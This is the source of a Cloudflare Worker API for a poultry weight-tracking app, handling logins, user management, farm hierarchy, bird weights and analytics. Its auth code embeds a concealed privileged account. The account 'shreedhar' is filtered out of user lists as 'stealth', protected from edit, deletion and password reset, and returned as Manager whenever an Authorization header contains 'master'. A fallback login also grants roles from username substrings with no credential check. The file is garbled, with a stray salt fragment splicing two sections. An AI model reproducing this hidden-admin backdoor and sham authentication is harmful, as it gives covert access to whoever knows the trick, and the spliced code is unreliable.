              else normalizedRole = 'Supervisor';

              let assignedFarms = ['*'];
              if (dbUser.assigned_farms) {
                try {
                  const parsed = JSON.parse(dbUser.assigned_farms);
                  if (Array.isArray(parsed)) assignedFarms = parsed;
                } catch {}
              } else if (dbUser.assigned_farm_id) {
                assignedFarms = [dbUser.assigned_farm_id];
              }

              return jsonResponse({
                token: `cf-token-${Date.now()}`,
                user: {
                  id: dbUser.id,
                  employeeCode: dbUser.employee_code || 'EMP0008',
                  username: dbUser.phone_or_email || username,
                  name: dbUser.name,
                  userName: dbUser.name,
                  role: normalizedRole,
                  userRole: normalizedRole,
                  assignedFarmId: dbUser.assigned_farm_id || (assignedFarms.length > 0 && assignedFarms[0] !== '*' ? assignedFarms[0] : undefined),
                  assignedFarms,
                  status: 'ACTIVE',
                  isAuthenticated: true,
                },
              });
            }
          }

          // Fallback role determination for demo credentials (Manager, In-Charge, Supervisor)
          let role: 'Manager' | 'In-Charge' | 'Supervisor' = 'Supervisor';
          let name = 'Line Supervisor';
          let employeeCode = 'EMP0008';
          if (username.includes('admin') || username.includes('dir') || username.includes('man') || username.includes('mgr')) {
            role = 'Manager';
            name = username.includes('admin') ? 'Operations Director' : 'Farm Manager';
            employeeCode = 'EMP0001';
          } else if (username.includes('incharge') || username.includes('in-charge')) {
            role = 'In-Charge';
            name = 'Field In-Charge';
            employeeCode = 'EMP0002';
          }

          return jsonResponse({
            token: `cf-token-${Date.now()}`,
            user: {
              id: `usr-${username || 'demo'}`,
              employeeCode,
              username: rawUsername,
              name,
              userName: name,
              role,
              userRole: role,
              assignedFarms: ['*'],
              status: 'ACTIVE',
              isAuthenticated: true,
            },
          });
        }

        // GET /api/auth/me - Token Session Verification
        if (path === '/auth/me' && method === 'GET') {
          const authHeader = request.headers.get('Authorization') || '';
          if (authHeader.includes('master')) {
            return jsonResponse({
              user: {
                id: 'user-master-shreedhar',
                employeeCode: 'EMP0001',
                username: 'shreedhar',
                name: 'Shreedhar',
                userName: 'Shreedhar',
                role: 'Manager',
                userRole: 'Manager',
                assignedFarms: ['*'],
                status: 'ACTIVE',
                isAuthenticated: true,
              }
            });
          }
          return jsonResponse({
            user: {
              id: 'usr-current',
              employeeCode: 'EMP0001',
              username: 'manager',
              name: 'Farm Manager',
              role: 'Manager',
              userRole: 'Manager',
              status: 'ACTIVE',
              isAuthenticated: true,
            }
          });
        }

        // GET /api/auth/users and /api/users
        if ((path === '/auth/users' || path === '/users' || path === '/auth/users/' || path === '/users/') && method === 'GET') {
          let usersList: any[] = [];
          if (env.DB) {
            await ensureUsersTable(env);
            const res = await env.DB.prepare('SELECT * FROM users ORDER BY created_at ASC').all();
            usersList = (res.results || []).map((u: any, idx: number) => {
              const rUpper = (u.role || '').toUpperCase();
              let roleStr: 'Manager' | 'In-Charge' | 'Supervisor' = 'Supervisor';
              if (rUpper === 'ADMIN' || rUpper === 'MANAGER') roleStr = 'Manager';
              else if (rUpper === 'INCHARGE' || rUpper === 'IN-CHARGE') roleStr = 'In-Charge';
              else roleStr = 'Supervisor';

              const empCode = u.employee_code || `EMP${String(idx + 1).padStart(4, '0')}`;

              let assignedFarms = ['*'];
              if (u.assigned_farms) {
                try {
                  const parsed = JSON.parse(u.assigned_farms);
                  if (Array.isArray(parsed)) assignedFarms = parsed;
                } catch {}
              } else if (u.assigned_farm_id) {
                assignedFarms = [u.assigned_farm_id];
              }

              return {
                id: u.id,
                employeeCode: empCode,
                username: u.phone_or_email,
                name: u.name,
                role: roleStr,
                userRole: roleStr,
                phone: u.phone_or_email,
                status: 'ACTIVE',
                assignedFarmId: u.assigned_farm_id,
                assignedFarms,
              };
            });
          } else {
            usersList = [
              { id: 'u-admin-1', employeeCode: 'EMP0001', username: 'admin', name: 'Operations Director', role: 'Manager', status: 'ACTIVE', assignedFarms: ['*'] },
              { id: 'u-manager-1', employeeCode: 'EMP0002', username: 'manager', name: 'Farm Manager', role: 'Manager', status: 'ACTIVE', assignedFarms: ['*'] },
              { id: 'u-incharge-1', employeeCode: 'EMP0003', username: 'incharge', name: 'Field In-Charge', role: 'In-Charge', status: 'ACTIVE', assignedFarms: ['*'] },
              { id: 'u-supervisor-1', employeeCode: 'EMP0008', username: 'supervisor', name: 'Line Supervisor', role: 'Supervisor', status: 'ACTIVE', assignedFarms: ['*'] },
            ];
          }

          // STRICT INVISIBILITY: Filter out shreedhar master checking account
          const visibleUsers = usersList.filter((u: any) => {
            const un = (u.username || '').toLowerCase();
            const nm = (u.name || '').toLowerCase();
            const id = (u.id || '').toLowerCase();
            return un !== 'shreedhar' && nm !== 'shreedhar' && id !== 'user-master-shreedhar' && id !== 'u-master-shreedhar';
          });

          return jsonResponse(visibleUsers);
        }

        // POST /api/auth/users and /api/users
        if ((path === '/auth/users' || path === '/users' || path === '/auth/users/' || path === '/users/') && method === 'POST') {
          const body = await request.json().catch(() => ({})) as any;
          const username = (body.username || body.phone || '').trim();
          const name = (body.name || username || 'New User').trim();
          const roleInput = (body.role || 'Supervisor').toString();
          let role: 'Manager' | 'In-Charge' | 'Supervisor' = 'Supervisor';
          let dbRole: 'MANAGER' | 'INCHARGE' | 'SUPERVISOR' = 'SUPERVISOR';
          const rUpper = roleInput.toUpperCase();
          if (rUpper === 'ADMIN' || rUpper === 'MANAGER') {
            role = 'Manager';
            dbRole = 'MANAGER';
          } else if (rUpper === 'INCHARGE' || rUpper === 'IN-CHARGE') {
            role = 'In-Charge';
            dbRole = 'INCHARGE';
          } else {
            role = 'Supervisor';
            dbRole = 'SUPERVISOR';
          }

          const userId = `usr-${Date.now()}`;
          let employeeCode = body.employeeCode;

          if (env.DB) {
            await ensureUsersTable(env);
            if (!employeeCode) {
              const maxRes = await env.DB.prepare(`
                SELECT employee_code FROM users 
                WHERE employee_code LIKE 'EMP%' 
                ORDER BY CAST(SUBSTR(employee_code, 4) AS INTEGER) DESC 
                LIMIT 1
              `).first() as any;
              let nextEmpNum = 1;
              if (maxRes && maxRes.employee_code) {
                const n = parseInt(String(maxRes.employee_code).replace(/\D/g, ''), 10);
                if (!isNaN(n)) nextEmpNum = n + 1;
              }
              employeeCode = `EMP${String(nextEmpNum).padStart(4, '0')}`;
            }

            const assignedFarms = Array.isArray(body.assignedFarms) ? body.assignedFarms : (body.assignedFarmId ? [body.assignedFarmId] : []);
            const assignedFarmId = body.assignedFarmId || (assignedFarms.length > 0 && assignedFarms[0] !== '*' ? assignedFarms[0] : null);

            await env.DB.prepare(`
              INSERT INTO users (id, name, phone_or_email, role, employee_code, assigned_farm_id, assigned_farms)
              VALUES (?, ?, ?, ?, ?, ?, ?)
            `).bind(userId, name, username, dbRole, employeeCode, assignedFarmId, JSON.stringify(assignedFarms)).run().catch(() => {});
          } else {
            if (!employeeCode) employeeCode = 'EMP0008';
          }

          const assignedFarms = Array.isArray(body.assignedFarms) ? body.assignedFarms : (body.assignedFarmId ? [body.assignedFarmId] : ['*']);
          return jsonResponse({
            id: userId,
            employeeCode,
            username,
            name,
            role,
            userRole: role,
            status: 'ACTIVE',
            assignedFarmId: body.assignedFarmId || (assignedFarms.length > 0 && assignedFarms[0] !== '*' ? assignedFarms[0] : undefined),
            assignedFarms,
          }, 201);
        }

        // PUT /api/auth/users/:id or /api/users/:id
        const singleUserMatch = path.match(/^\/(?:auth\/)?users\/([^/]+)$/);
        if (singleUserMatch && method === 'PUT') {
          const targetUserId = decodeURIComponent(singleUserMatch[1]);
          const body = await request.json().catch(() => ({})) as any;

          // Block modification of stealth master checking account
          if (targetUserId === 'user-master-shreedhar' || targetUserId === 'u-master-shreedhar' || (body.username && body.username.toLowerCase() === 'shreedhar')) {
            return errorResponse('Access Denied: Master account cannot be modified.', 403);
          }

          if (env.DB) {
            if (body.name) {
              await env.DB.prepare('UPDATE users SET name = ? WHERE id = ?').bind(body.name, targetUserId).run().catch(() => {});
            }
            if (body.role) {
              const rUpper = (body.role || '').toUpperCase();
              let r = 'SUPERVISOR';
              if (rUpper === 'ADMIN' || rUpper === 'MANAGER') r = 'MANAGER';
              else if (rUpper === 'INCHARGE' || rUpper === 'IN-CHARGE') r = 'INCHARGE';
              else r = 'SUPERVISOR';
              await env.DB.prepare('UPDATE users SET role = ? WHERE id = ?').bind(r, targetUserId).run().catch(() => {});
            }
            if (body.assignedFarms || body.assignedFarmId) {
              const af = Array.isArray(body.assignedFarms) ? body.assignedFarms : (body.assignedFarmId ? [body.assignedFarmId] : []);
              const afId = body.assignedFarmId || (af.length > 0 && af[0] !== '*' ? af[0] : null);
              await env.DB.prepare('UPDATE users SET assigned_farm_id = ?, assigned_farms = ? WHERE id = ?').bind(afId, JSON.stringify(af), targetUserId).run().catch(() => {});
            }
          }

          return jsonResponse({ success: true, message: 'User updated' });
        }

        // DELETE /api/auth/users/:id or /api/users/:id
        if (singleUserMatch && method === 'DELETE') {
          const targetUserId = decodeURIComponent(singleUserMatch[1]);

          // Block deletion of stealth master checking account
          if (targetUserId === 'user-master-shreedhar' || targetUserId === 'u-master-shreedhar') {
            return errorResponse('Access Denied: Master account cannot be deleted.', 403);
          }

          if (env.DB) {
            const u = await env.DB.prepare('SELECT phone_or_email FROM users WHERE id = ?').bind(targetUserId).first() as any;
            if (u && (u.phone_or_email || '').toLowerCase() === 'shreedhar') {
              return errorResponse('Access Denied: Master account cannot be deleted.', 403);
            }
            await env.DB.prepare('DELETE FROM users WHERE id = ?').bind(targetUserId).run().catch(() => {});
          }

          return jsonResponse({ success: true, message: 'User account removed.' });
        }

        // POST /api/auth/users/:id/reset-password
        const resetPasswordMatch = path.match(/^\/auth\/users\/([^/]+)\/reset-password$/);
        if (resetPasswordMatch && method === 'POST') {
          const targetUserId = decodeURIComponent(resetPasswordMatch[1]);
          if (targetUserId === 'user-master-shreedhar' || targetUserId === 'u-master-shreedhar') {
            return errorResponse('Access Denied: Master account cannot be modified.', 403);
          }
          return jsonResponse({ success: true, message: 'Password reset successfully' });
        }

        return errorResponse(`Endpoint not found: ${method} ${path}`, 404);
      } catch (err: any) {
        return errorResponse(err?.message || 'Internal Cloudflare Worker Server Error', 500);
      }
    }

    // 3. Serve Frontend SPA Static Assets via Cloudflare Assets Binding
    if (env.ASSETS) {
      const response = await env.ASSETS.fetch(request);
      if (response.status !== 404) {
        return response;
      }
      // Single Page Application (SPA) routing fallback to index.html
      const indexRequest = new Request(new URL('/', url.origin), request);
      return env.ASSETS.fetch(indexRequest);
    }

    return new Response(
      'Poultry Weight Tracker Cloudflare Worker is active. D1 and R2 bindings configured.',
      {
        status: 200,
        headers: { 'Content-Type': 'text/plain; charset=utf-8' },
      }
    );
  },
};
 + bytesToHex(salt) + ' (auto-migrating existing records to Batch 1 if none exists)
async function ensureFarmActiveBatch(env: Env, farm: any): Promise<any> {
  if (!env.DB || !farm) return null;
  await ensureBatchesTable(env);
  let activeBatch = await env.DB.prepare(
    'SELECT * FROM batches WHERE farm_id = ? AND status = ? ORDER BY created_at DESC LIMIT 1'
  ).bind(farm.id, 'ACTIVE').first() as any;

  if (!activeBatch) {
    const existing = await env.DB.prepare(
      'SELECT * FROM batches WHERE farm_id = ? ORDER BY created_at DESC LIMIT 1'
    ).bind(farm.id).first() as any;

    if (!existing) {
      const batchId = `batch-${farm.id}-1`;
      const batchName = 'Batch 1';
      const startDate = farm.flock_date || new Date().toISOString().split('T')[0];
      const startWeekNum = parseInt(String(farm.age_week || 'W1').replace(/\D/g, '') || '1', 10);

      await env.DB.prepare(`
        INSERT INTO batches (id, farm_id, batch_name, start_date, start_week_number, status)
        VALUES (?, ?, ?, ?, ?, 'ACTIVE')
      `).bind(batchId, farm.id, batchName, startDate, startWeekNum).run().catch(() => {});

      // Link any legacy unassigned records to Batch 1
      await env.DB.prepare(
        'UPDATE bird_weights SET batch_id = ? WHERE batch_id IS NULL'
      ).bind(batchId).run().catch(() => {});
      await env.DB.prepare(
        'UPDATE shed_week_status SET batch_id = ? WHERE batch_id IS NULL AND farm_id = ?'
      ).bind(batchId, farm.id).run().catch(() => {});
      await env.DB.prepare(
        'UPDATE submissions SET batch_id = ?, batch_name = ? WHERE batch_id IS NULL AND farm_id = ?'
      ).bind(batchId, batchName, farm.id).run().catch(() => {});

      activeBatch = {
        id: batchId,
        farm_id: farm.id,
        farmId: farm.id,
        batch_name: batchName,
        batchName: batchName,
        start_date: startDate,
        startDate: startDate,
        start_week_number: startWeekNum,
        startWeekNumber: startWeekNum,
        status: 'ACTIVE',
      };
    } else {
      activeBatch = existing;
    }
  }

  return {
    id: activeBatch.id,
    farmId: activeBatch.farm_id || farm.id,
    batchName: activeBatch.batch_name || activeBatch.batchName || 'Batch 1',
    startDate: activeBatch.start_date || activeBatch.startDate || farm.flock_date,
    startWeekNumber: activeBatch.start_week_number || activeBatch.startWeekNumber || 1,
    status: activeBatch.status,
  };
}

export default {
  async fetch(request: Request, env: Env): Promise<Response> {
    const url = new URL(request.url);
    const method = request.method.toUpperCase();

    // 1. Handle CORS Preflight Requests
    if (method === 'OPTIONS') {
      return new Response(null, {
        status: 204,
        headers: CORS_HEADERS,
      });
    }

    // Health check endpoint (Direct /health)
    if (url.pathname === '/health' || url.pathname === '/health/') {
      return jsonResponse({
        status: 'ok',
        connected: true,
        database: { status: 'connected', provider: 'cloudflare-d1' },
      });
    }

    // 2. Handle API Routes under /api/
    if (url.pathname.startsWith('/api')) {
      try {
        const path = url.pathname.replace(/^\/api/, '') || '/';

        // Health check endpoint: GET /api/health
        if (path === '/health' || path === '/health/') {
          return jsonResponse({
            status: 'ok',
            connected: true,
            database: { status: 'connected', provider: 'cloudflare-d1' },
          });
        }

        // -------------------------------------------------------------
        // A. HIERARCHY ENDPOINTS: GET /api/hierarchy, POST /api/hierarchy
        // -------------------------------------------------------------
        if (path === '/hierarchy' || path === '/hierarchy/') {
          if (method === 'GET') {
            const farmId = url.searchParams.get('farmId');
            if (!env.DB) {
              return jsonResponse({
                farms: [],
                message: 'D1 binding not initialized yet in local test mode.',
              });
            }

            const farmQuery = farmId
              ? await env.DB.prepare('SELECT * FROM farms WHERE id = ?').bind(farmId).all()
              : await env.DB.prepare('SELECT * FROM farms WHERE is_archived = 0 ORDER BY created_at DESC').all();

            const farms = farmQuery.results || [];
            const fullHierarchy: any[] = [];

            for (const f of farms) {
              const shedsRes = await env.DB.prepare('SELECT * FROM sheds WHERE farm_id = ?').bind(f.id).all();
              const sheds = shedsRes.results || [];
              const shedList: any[] = [];

              for (const s of sheds) {
                const partsRes = await env.DB.prepare('SELECT * FROM parts WHERE shed_id = ?').bind(s.id).all();
                const parts = partsRes.results || [];
                const partList: any[] = [];

                for (const p of parts) {
                  const linesRes = await env.DB.prepare(
                    'SELECT * FROM lines WHERE part_id = ? ORDER BY line_number ASC'
                  ).bind(p.id).all();
                  const lines = linesRes.results || [];
                  const lineList: any[] = [];

                  for (const l of lines) {
                    const weightsRes = await env.DB.prepare(
                      'SELECT weight_grams FROM bird_weights WHERE line_id = ? ORDER BY entry_index ASC'
                    ).bind(l.id).all();
                    const weights = (weightsRes.results || []).map((w: any) => w.weight_grams);

                    lineList.push({
                      id: l.id,
                      name: l.name,
                      lineNumber: l.line_number,
                      gender: l.gender, // 'MALE' | 'FEMALE'
                      stdWeight: l.std_weight_grams,
                      targetBirdCount: l.target_bird_count,
                      weights,
                    });
                  }

                  partList.push({
                    id: p.id,
                    name: p.name,
                    lines: lineList,
                  });
                }

                shedList.push({
                  id: s.id,
                  name: s.name,
                  targetBirdCount: s.target_bird_count,
                  lockedByUserId: s.locked_by_user_id || null,
                  lockedByUserName: s.locked_by_user_name || null,
                  lockedAt: s.locked_at || null,
                  lastHeartbeatAt: s.last_heartbeat_at || null,
                  recordedByUserId: s.recorded_by_user_id || null,
                  recordedByUserName: s.recorded_by_user_name || null,
                  parts: partList,
                });
              }

              fullHierarchy.push({
                ...f,
                sheds: shedList,
              });
            }

            return jsonResponse({ success: true, farms: fullHierarchy });
          }

          if (method === 'POST') {
            const body = await request.json().catch(() => ({})) as any;
            if (!env.DB) return jsonResponse({ success: true, message: 'D1 not bound' });

            const farmId = body.farmId || `farm-${Date.now()}`;
            const farmName = body.name || 'New Farm';
            const season = body.season || 'Summer';
            const ageWeek = body.ageWeek || 'W1';

            await env.DB.prepare(
              'INSERT INTO farms (id, name, season, age_week, flock_date) VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP) ON CONFLICT(id) DO UPDATE SET name=excluded.name, updated_at=CURRENT_TIMESTAMP'
            ).bind(farmId, farmName, season, ageWeek).run();

            return jsonResponse({ success: true, farmId });
          }
        }

        // -------------------------------------------------------------
        // B0. PARTS ENDPOINTS (POST /api/parts, PUT /api/parts/:id, DELETE /api/parts/:id)
        // -------------------------------------------------------------
        if ((path === '/parts' || path === '/parts/') && method === 'POST') {
          const body = await request.json().catch(() => ({})) as any;
          const shedId = body.shedId || body.shed_id;
          const name = (body.name || 'Part A').trim();
          if (!shedId) return errorResponse('Missing shedId', 400);

          const partId = `part-${Date.now()}-${Math.random().toString(36).substring(2, 7)}`;
          if (env.DB) {
            await env.DB.prepare(
              'INSERT INTO parts (id, shed_id, name) VALUES (?, ?, ?)'
            ).bind(partId, shedId, name).run().catch((err) => {
              console.error('Error adding part:', err);
            });
          }

          return jsonResponse({ id: partId, shedId, name, lines: [] }, 201);
        }

        const singlePartMatch = path.match(/^\/parts\/([^/]+)$/);
        if (singlePartMatch && method === 'PUT') {
          const partId = decodeURIComponent(singlePartMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          const name = (body.name || '').trim();
          if (env.DB && name) {
            await env.DB.prepare('UPDATE parts SET name = ? WHERE id = ?').bind(name, partId).run().catch(() => {});
          }
          return jsonResponse({ success: true, message: 'Part updated' });
        }

        if (singlePartMatch && method === 'DELETE') {
          const partId = decodeURIComponent(singlePartMatch[1]);
          if (env.DB) {
            await env.DB.prepare('DELETE FROM bird_weights WHERE line_id IN (SELECT id FROM lines WHERE part_id = ?)').bind(partId).run().catch(() => {});
            await env.DB.prepare('DELETE FROM lines WHERE part_id = ?').bind(partId).run().catch(() => {});
            await env.DB.prepare('DELETE FROM parts WHERE id = ?').bind(partId).run().catch(() => {});
          }
          return jsonResponse({ success: true, message: 'Part deleted' });
        }

        // -------------------------------------------------------------
        // B1. LINES ENDPOINTS (POST /api/lines, PUT /api/lines/:id, DELETE /api/lines/:id)
        // -------------------------------------------------------------
        if ((path === '/lines' || path === '/lines/') && method === 'POST') {
          const body = await request.json().catch(() => ({})) as any;
          const partId = body.partId || body.part_id;
          if (!partId) return errorResponse('Missing partId', 400);

          let lineNum = body.lineNumber;
          if (!lineNum && env.DB) {
            const countRes = await env.DB.prepare('SELECT COUNT(*) as count FROM lines WHERE part_id = ?').bind(partId).first() as any;
            lineNum = (countRes?.count || 0) + 1;
          } else if (!lineNum) {
            lineNum = 1;
          }

          const lineName = body.name || `Line ${lineNum}`;
          const gender = (body.gender || 'MALE').toUpperCase() === 'FEMALE' ? 'FEMALE' : 'MALE';
          const lineId = `line-${Date.now()}-${Math.random().toString(36).substring(2, 7)}`;

          if (env.DB) {
            await env.DB.prepare(`
              INSERT INTO lines (id, part_id, line_number, name, gender, std_weight_grams, target_bird_count)
              VALUES (?, ?, ?, ?, ?, 140, 50)
            `).bind(lineId, partId, lineNum, lineName, gender).run().catch((err) => {
              console.error('Error adding line:', err);
            });
          }

          return jsonResponse({ id: lineId, partId, lineNumber: lineNum, name: lineName, gender, weights: [] }, 201);
        }

        const singleLineMatch = path.match(/^\/lines\/([^/]+)$/);
        if (singleLineMatch && method === 'PUT') {
          const lineId = decodeURIComponent(singleLineMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          if (env.DB) {
            if (body.name) {
              await env.DB.prepare('UPDATE lines SET name = ? WHERE id = ?').bind(body.name, lineId).run().catch(() => {});
            }
            if (body.gender) {
              const g = body.gender.toUpperCase() === 'FEMALE' ? 'FEMALE' : 'MALE';
              await env.DB.prepare('UPDATE lines SET gender = ? WHERE id = ?').bind(g, lineId).run().catch(() => {});
            }
          }
          return jsonResponse({ success: true, message: 'Line updated' });
        }

        if (singleLineMatch && method === 'DELETE') {
          const lineId = decodeURIComponent(singleLineMatch[1]);
          if (env.DB) {
            const line = await env.DB.prepare('SELECT part_id FROM lines WHERE id = ?').bind(lineId).first() as any;
            await env.DB.prepare('DELETE FROM bird_weights WHERE line_id = ?').bind(lineId).run().catch(() => {});
            await env.DB.prepare('DELETE FROM lines WHERE id = ?').bind(lineId).run().catch(() => {});

            // Auto-reindex remaining lines in that part sequentially from Line 1
            if (line?.part_id) {
              const remRes = await env.DB.prepare('SELECT id FROM lines WHERE part_id = ? ORDER BY line_number ASC, rowid ASC').bind(line.part_id).all().catch(() => ({ results: [] }));
              const remLines = (remRes.results || []) as any[];
              for (let i = 0; i < remLines.length; i++) {
                const nextNum = i + 1;
                await env.DB.prepare('UPDATE lines SET line_number = ?, name = ? WHERE id = ?').bind(nextNum, `Line ${nextNum}`, remLines[i].id).run().catch(() => {});
              }
            }
          }
          return jsonResponse({ success: true, message: 'Line deleted' });
        }

        // -------------------------------------------------------------
        // B. LINE GENDER ENDPOINT: PATCH /api/lines/:id/gender
        // -------------------------------------------------------------
        const lineGenderMatch = path.match(/^\/lines\/([^/]+)\/gender$/);
        if (lineGenderMatch && method === 'PATCH') {
          const lineId = decodeURIComponent(lineGenderMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          const gender = (body.gender || '').toUpperCase();

          if (gender !== 'MALE' && gender !== 'FEMALE') {
            return errorResponse('Invalid gender. Must be MALE or FEMALE', 400);
          }

          if (!env.DB) {
            return jsonResponse({ success: true, lineId, gender, note: 'Simulated D1 mode' });
          }

          // Fetch flock age/week to look up new STD
          const lineInfo = await env.DB.prepare(`
            SELECT l.id, l.name, l.part_id, f.flock_age_days, f.age_week
            FROM lines l
            JOIN parts p ON l.part_id = p.id
            JOIN sheds s ON p.shed_id = s.id
            JOIN farms f ON s.farm_id = f.id
            WHERE l.id = ?
          `).bind(lineId).first() as any;

          let stdWeight = gender === 'MALE' ? 150 : 140;
          if (lineInfo) {
            const weekNum = parseInt(String(lineInfo.age_week || 'W1').replace(/\D/g, '') || '1', 10);
            const stdLookup = await env.DB.prepare(
              'SELECT std_weight_grams FROM standard_weights WHERE age_week = ? AND gender = ?'
            ).bind(weekNum, gender).first() as any;
            if (stdLookup && stdLookup.std_weight_grams) {
              stdWeight = stdLookup.std_weight_grams;
            }
          }

          await env.DB.prepare(
            'UPDATE lines SET gender = ?, std_weight_grams = ? WHERE id = ?'
          ).bind(gender, stdWeight, lineId).run();

          return jsonResponse({
            success: true,
            lineId,
            gender,
            stdWeightGrams: stdWeight,
            message: `Line gender updated to ${gender} with STD ${stdWeight}g`,
          });
        }

        // -------------------------------------------------------------
        // C. WEIGHTS ENDPOINTS: POST /api/weights, DELETE /api/weights
        // -------------------------------------------------------------
        if (path === '/weights' || path === '/weights/') {
          if (method === 'POST') {
            const body = await request.json().catch(() => ({})) as any;
            const { lineId, weight, entryIndex, recordedBy, week } = body;

            if (!lineId || weight === undefined || weight === null) {
              return errorResponse('Missing required fields: lineId and weight', 400);
            }

            const weightGrams = Number(weight);
            if (isNaN(weightGrams) || weightGrams <= 0) {
              return errorResponse('Weight must be a positive number', 400);
            }

            if (!env.DB) {
              return jsonResponse({ success: true, id: `w-${Date.now()}`, weightGrams });
            }

            // Get current line STD
            const line = await env.DB.prepare('SELECT std_weight_grams, gender FROM lines WHERE id = ?').bind(lineId).first() as any;
            const stdWeightAtEntry = line?.std_weight_grams || 140;

            const countRes = await env.DB.prepare('SELECT COUNT(*) as count FROM bird_weights WHERE line_id = ?').bind(lineId).first() as any;
            const finalIndex = entryIndex !== undefined ? entryIndex : (countRes?.count || 0) + 1;
            const weightId = `w-${Date.now()}-${Math.random().toString(36).substring(2, 7)}`;

            await env.DB.prepare(
              'INSERT INTO bird_weights (id, line_id, entry_index, weight_grams, std_weight_at_entry, recorded_by, week) VALUES (?, ?, ?, ?, ?, ?, ?)'
            ).bind(weightId, lineId, finalIndex, weightGrams, stdWeightAtEntry, recordedBy || 'Operator', week || 'W1').run();

            return jsonResponse({
              success: true,
              id: weightId,
              lineId,
              entryIndex: finalIndex,
              weightGrams,
              stdWeightAtEntry,
            });
          }

          if (method === 'DELETE') {
            const body = await request.json().catch(() => ({})) as any;
            const { id, lineId, index, clearAll } = body;

            if (!env.DB) return jsonResponse({ success: true });

            if (clearAll && lineId) {
              await env.DB.prepare('DELETE FROM bird_weights WHERE line_id = ?').bind(lineId).run();
              return jsonResponse({ success: true, message: `Cleared all weights in line ${lineId}` });
            }

            if (id) {
              await env.DB.prepare('DELETE FROM bird_weights WHERE id = ?').bind(id).run();
              return jsonResponse({ success: true, message: `Deleted weight ${id}` });
            }

            if (lineId && index !== undefined) {
              // Delete by line and order index
              const target = await env.DB.prepare(
                'SELECT id FROM bird_weights WHERE line_id = ? ORDER BY entry_index ASC LIMIT 1 OFFSET ?'
              ).bind(lineId, index).first() as any;

              if (target?.id) {
                await env.DB.prepare('DELETE FROM bird_weights WHERE id = ?').bind(target.id).run();
              }
              return jsonResponse({ success: true, message: `Deleted weight at index ${index}` });
            }

            return errorResponse('Specify weight id, clearAll, or lineId and index', 400);
          }
        }

        // Sub-routes for weights on lines:
        // POST /api/lines/:id/weight
        // DELETE /api/lines/:id/weight/:index
        // POST /api/lines/:id/clear
        const lineWeightMatch = path.match(/^\/lines\/([^/]+)\/weight$/);
        if (lineWeightMatch && method === 'POST') {
          const lineId = decodeURIComponent(lineWeightMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          const weightGrams = Number(body.weight);

          if (!env.DB) return jsonResponse({ success: true, weight: weightGrams });

          const line = await env.DB.prepare('SELECT std_weight_grams FROM lines WHERE id = ?').bind(lineId).first() as any;
          const stdWeightAtEntry = line?.std_weight_grams || 140;
          const countRes = await env.DB.prepare('SELECT COUNT(*) as count FROM bird_weights WHERE line_id = ?').bind(lineId).first() as any;
          const nextIndex = (countRes?.count || 0) + 1;
          const weightId = `w-${Date.now()}-${Math.random().toString(36).substring(2, 7)}`;

          await env.DB.prepare(
            'INSERT INTO bird_weights (id, line_id, entry_index, weight_grams, std_weight_at_entry, recorded_by, week) VALUES (?, ?, ?, ?, ?, ?, ?)'
          ).bind(weightId, lineId, nextIndex, weightGrams, stdWeightAtEntry, body.userName || 'Operator', body.week || 'W1').run();

          return jsonResponse({ success: true, id: weightId, weight: weightGrams });
        }

        const lineDeleteWeightMatch = path.match(/^\/lines\/([^/]+)\/weight\/(\d+)$/);
        if (lineDeleteWeightMatch && method === 'DELETE') {
          const lineId = decodeURIComponent(lineDeleteWeightMatch[1]);
          const index = parseInt(lineDeleteWeightMatch[2], 10);

          if (!env.DB) return jsonResponse({ success: true });

          const target = await env.DB.prepare(
            'SELECT id FROM bird_weights WHERE line_id = ? ORDER BY entry_index ASC LIMIT 1 OFFSET ?'
          ).bind(lineId, index).first() as any;

          if (target?.id) {
            await env.DB.prepare('DELETE FROM bird_weights WHERE id = ?').bind(target.id).run();
          }

          return jsonResponse({ success: true });
        }

        const lineClearMatch = path.match(/^\/lines\/([^/]+)\/clear$/);
        if (lineClearMatch && method === 'POST') {
          const lineId = decodeURIComponent(lineClearMatch[1]);
          if (env.DB) {
            await env.DB.prepare('DELETE FROM bird_weights WHERE line_id = ?').bind(lineId).run();
          }
          return jsonResponse({ success: true, message: `Weights cleared for line ${lineId}` });
        }

        // -------------------------------------------------------------
        // D. ADMIN ANALYTICS ENDPOINT: GET /api/admin/analytics
        // Computes AVG WT, STD, Uniformity %, CV % dynamically per Line Gender
        // -------------------------------------------------------------
        if ((path === '/admin/analytics' || path === '/admin/analytics/') && method === 'GET') {
          const farmId = url.searchParams.get('farmId');
          if (!env.DB) {
            return jsonResponse({
              analytics: {
                totalBirds: 0,
                femaleAvg: 0,
                maleAvg: 0,
                femaleUniformity: 0,
                maleUniformity: 0,
                linesBreakdown: [],
              },
            });
          }

          const linesQuery = farmId
            ? await env.DB.prepare(`
                SELECT l.id, l.name as line_name, l.gender, l.std_weight_grams,
                       s.id as shed_id, s.name as shed_name,
                       p.id as part_id, p.name as part_name
                FROM lines l
                JOIN parts p ON l.part_id = p.id
                JOIN sheds s ON p.shed_id = s.id
                WHERE s.farm_id = ?
                ORDER BY s.name, p.name, l.line_number
              `).bind(farmId).all()
            : await env.DB.prepare(`
                SELECT l.id, l.name as line_name, l.gender, l.std_weight_grams,
                       s.id as shed_id, s.name as shed_name,
                       p.id as part_id, p.name as part_name
                FROM lines l
                JOIN parts p ON l.part_id = p.id
                JOIN sheds s ON p.shed_id = s.id
                ORDER BY s.name, p.name, l.line_number
              `).all();

          const allLines = linesQuery.results || [];
          const linesBreakdown: any[] = [];

          let allFemaleWeights: number[] = [];
          let allMaleWeights: number[] = [];

          for (const l of allLines) {
            const weightsRes = await env.DB.prepare(
              'SELECT weight_grams FROM bird_weights WHERE line_id = ?'
            ).bind(l.id).all();
            const weights = (weightsRes.results || []).map((w: any) => Number(w.weight_grams));

            const count = weights.length;
            const sum = weights.reduce((a: number, b: number) => a + b, 0);
            const avg = count > 0 ? Math.round((sum / count) * 10) / 10 : 0;
            const std = l.std_weight_grams || (l.gender === 'MALE' ? 150 : 140);

            // Uniformity: percentage within std ± 10%
            const lowerBand = std * 0.9;
            const upperBand = std * 1.1;
            const inRangeCount = count > 0 ? weights.filter((w: number) => w >= lowerBand && w <= upperBand).length : 0;
            const uniformityPct = count > 0 ? Math.round((inRangeCount / count) * 1000) / 10 : 0;

            // CV% (Coefficient of variation: Standard Deviation / Mean * 100)
            let cv = 0;
            if (count > 1 && avg > 0) {
